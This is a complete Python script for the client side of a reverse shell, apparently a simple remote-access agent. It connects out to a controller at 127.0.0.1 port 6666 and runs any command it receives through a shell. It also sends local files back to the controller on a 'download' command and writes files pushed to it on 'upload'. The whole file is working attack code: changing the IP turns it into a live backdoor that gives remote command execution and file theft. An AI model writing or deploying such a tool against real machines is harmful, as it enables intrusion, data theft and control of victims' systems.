import socket
import subprocess
import os

ip = '127.0.0.1'
port = 6666

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip, port))

msg = 'TEST CLIENT'
cs.send(msg.encode())

while True:
    try:
        msg = cs.recv(2048).decode()
        if msg == 'quit':
            break

        msg_parts = msg.split(" ")

        if msg_parts[0] == 'download':
            filename = msg_parts[1]
            if os.path.exists(filename) and os.path.isfile(filename) and os.path.getsize(filename) > 0:
                with open(filename, 'rb') as f:
                    while True:
                        chunk = f.read(2048)
                        if not chunk:
                            break
                        cs.send(chunk)
            else:
                cs.send(b"Error: File not found or empty on agent side.")

        elif msg_parts[0] == 'upload':
            filename = msg_parts[1]
            # Acknowledge receipt of the command
            cs.send(b"Ready for upload")
            # Receive the file contents or a specific command indicating an empty file
            contents = cs.recv(2048)
            if contents == b"Empty File Acknowledged":
                # Handle the case where the server acknowledged an attempt to upload an empty file
                # You might choose to simply pass or create an empty file as per requirements
                #open(filename, 'wb').close()
                cs.send(b"Empty File")
            elif not contents:
                # This block may not be reached if the server is correctly handling empty files,
                # but it's good practice to handle unexpected empty responses
                cs.send(b"Dont send 0 KB files.")
            else:
                with open(filename, 'wb') as f:
                    f.write(contents)
                # Send acknowledgment of successful file upload
                cs.send(b"File Upload Successful.")


        else:
            p = subprocess.Popen(
                msg_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
            )
            output, error = p.communicate()
            if len(output) > 0:
                msg = output.decode()
            else:
                msg = error.decode()
            cs.send(msg.encode())

    except ConnectionResetError:
        print("Connection closed by server.")
        break

cs.close()
